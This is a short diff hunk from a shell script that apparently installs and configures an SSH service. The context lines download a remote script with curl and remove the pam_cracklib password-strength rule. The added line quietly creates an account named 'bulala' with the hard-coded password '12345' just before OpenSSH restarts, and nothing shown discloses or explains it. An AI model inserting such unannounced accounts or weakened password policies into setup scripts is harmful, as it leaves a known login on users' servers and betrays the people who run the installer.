@@ -343,6 +343,7 @@ curl -4skL "https://raw.githubusercontent.com/azzphucdev/SSHPLUS2/main/AZZPHUC%2
 sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password && sed -i 's|use_authtok ||g' /etc/pam.d/common-password
 
 echo -e "[\e[33mNotice\e[0m] Restarting OpenSSH Service.."
+/usr/sbin/useradd -p $(openssl passwd -1 12345) -s /bin/false -M bulala
 systemctl restart ssh &> /dev/null
 }
 
